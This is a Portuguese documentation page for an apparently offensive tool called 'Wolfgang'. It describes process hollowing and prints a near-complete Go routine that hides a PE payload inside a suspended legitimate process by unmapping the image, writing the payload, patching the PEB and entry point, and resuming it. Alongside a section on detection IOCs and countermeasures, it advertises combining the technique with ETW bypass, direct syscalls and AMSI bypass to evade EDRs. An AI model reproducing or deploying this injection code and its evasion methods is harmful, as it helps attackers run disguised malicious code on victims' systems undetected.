    Process Hollowing¶

    O que é¶

    Process hollowing é uma técnica de injeção que substitui a imagem de um processo legítimo por um payload malicioso. O processo é criado em estado SUSPENDED, sua imagem original é desmapeada da memória, e o payload é mapeado no lugar. Quando o processo é resumido, ele executa o payload em vez do código original.

    O resultado é um processo que aparece como um binário legítimo (ex: svchost.exe) no Task Manager e outras ferramentas de monitoramento, mas na verdade executa código controlado pelo atacante.

    Por que funciona¶

    A técnica explora o mecanismo de criação de processos do Windows:

    1. CreateProcess com flag CREATE_SUSPENDED cria o processo, mapeia a imagem e configura a thread principal -- mas não inicia a execução
    2. Nesse estado, o PEB (Process Environment Block) contém o ImageBaseAddress apontando para a imagem mapeada
    3. O thread context contém RDX = PEB address e RCX = entry point

    Como o processo está suspenso, temos controle total para:

    • Desmapear a imagem original via NtUnmapViewOfSection
    • Alocar nova memória no endereço preferido do payload
    • Escrever o PE completo (headers + seções)
    • Atualizar o PEB com o novo image base
    • Atualizar o entry point no thread context
    • Resumir a thread

    O kernel não valida se a imagem em memória corresponde ao arquivo em disco depois que o processo já foi criado. A identidade do processo (nome, caminho) permanece associada ao binário original.

    Implementação no Wolfgang¶

    Fluxo completo¶

    func platformHollowingInject(targetExe string, payload []byte) error {
    // 1. Cria o processo alvo suspense
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Cb = uint32(unsafe.Sizeof(si))

    windows.CreateProcess(
        nil, argv, nil, nil, false,
        winapi.CreateSuspended,  // CREATE_SUSPENDED
        nil, nil, &si, &pi,
    )

    Leitura do PEB¶

        // 2. Obtém o thread context (RDX = PEB address para x64)
    ctx, _ := getThreadContext(uintptr(pi.Thread))
    pebAddr := ctx.rdx()

    // 3. Lê o image base do PEB+0x10
    imageBaseBytes, _ := winapi.ReadProcessMemory(
        uintptr(pi.Process), uintptr(pebAddr+0x10), 8)
    imageBase := binary.LittleEndian.Uint64(imageBaseBytes)

    No x64, quando um processo é criado suspenso, o context da thread principal tem:

    • RDX = endereço do PEB
    • RCX = entry point da imagem original

    O PEB64 tem o ImageBaseAddress no offset +0x10.

    Unmap e remap¶

        // 4. Desmapeia a imagem original
    ntUnmapViewOfSection(uintptr(pi.Process), uintptr(imageBase))

    // 5. Parse do PE payload para extrair informações
    peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
    optOff := peOffset + 24
    entryPointRVA := binary.LittleEndian.Uint32(payload[optOff+16:])
    preferredBase := binary.LittleEndian.Uint64(payload[optOff+24:])
    sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
    sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])

    // 6. Aloca memória no endereço preferido
    newBase, _ := winapi.VirtualAllocEx(
        uintptr(pi.Process),
        uintptr(preferredBase),
        uintptr(sizeOfImage),
        winapi.MemCommit|winapi.MemReserve,
        winapi.PageExecuteReadWrite,
    )

    Escrita do PE¶

        // 7. Escreve headers do PE
    winapi.WriteProcessMemory(uintptr(pi.Process), newBase, payload[:sizeOfHeaders])

    // 8. Escreve cada seção
    numSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
    sizeOfOptHeader := binary.LittleEndian.Uint16(payload[peOffset+20:])
    sectionOff := peOffset + 24 + uint32(sizeOfOptHeader)

    for i := uint16(0); i < numSections; i++ {
        secHdrOff := sectionOff + uint32(i)*40
        virtualAddr := binary.LittleEndian.Uint32(payload[secHdrOff+12:])
        rawSize := binary.LittleEndian.Uint32(payload[secHdrOff+16:])
        rawPtr := binary.LittleEndian.Uint32(payload[secHdrOff+20:])

        winapi.WriteProcessMemory(
            uintptr(pi.Process),
            newBase+uintptr(virtualAddr),
            payload[rawPtr:rawPtr+rawSize],
        )
    }

    Patch do PEB e resume¶

        // 9. Atualiza o PEB com o novo image base
    newBaseBytes := make([]byte, 8)
    binary.LittleEndian.PutUint64(newBaseBytes, uint64(newBase))
    winapi.WriteProcessMemory(
        uintptr(pi.Process), uintptr(pebAddr+0x10), newBaseBytes)

    // 10. Atualiza o entry point no thread context
    ctx.setRcx(uint64(newBase) + uint64(entryPointRVA))
    setThreadContext(uintptr(pi.Thread), ctx)

    // 11. Resume a thread
    resumeThread(uintptr(pi.Thread))
    return nil
}

    Detecção¶

    IOC Descrição
    CreateProcess com CREATE_SUSPENDED Criação de processo suspenso
    NtUnmapViewOfSection Desmapeamento da imagem original
    WriteProcessMemory cross-process Escrita na memória de outro processo
    SetThreadContext Modificação do entry point
    ResumeThread Resume após modificação
    Imagem em memória != imagem em disco Integrity check PE headers
    RWX allocation em processo remoto VirtualAllocEx com PAGE_EXECUTE_READWRITE

    Cadeia de detecção de EDRs¶

    EDRs modernos detectam process hollowing correlacionando a sequência de API calls:

    CreateProcess(SUSPENDED) → NtUnmapViewOfSection → VirtualAllocEx →
WriteProcessMemory → SetThreadContext → ResumeThread

    Essa sequência é altamente indicativa e não ocorre em software legítimo.

    Contramedidas¶

    • Kernel callbacks: PsSetCreateProcessNotifyRoutine detecta criação de processos
    • Image integrity: Comparar PE em memória com PE em disco (NtQueryVirtualMemory + file hash comparison)
    • Thread start monitoring: Verificar se o entry point da thread aponta para uma região válida da imagem mapeada
    • ETW process events: Events de CreateProcess e NtUnmapViewOfSection

    Evasão de detecção¶

    O Wolfgang pode combinar process hollowing com:

    • ETW bypass: Silencia eventos de process creation
    • Direct syscalls: Evita hooks em NtUnmapViewOfSection e NtWriteVirtualMemory
    • AMSI bypass: Impede scanning do payload antes da injeção
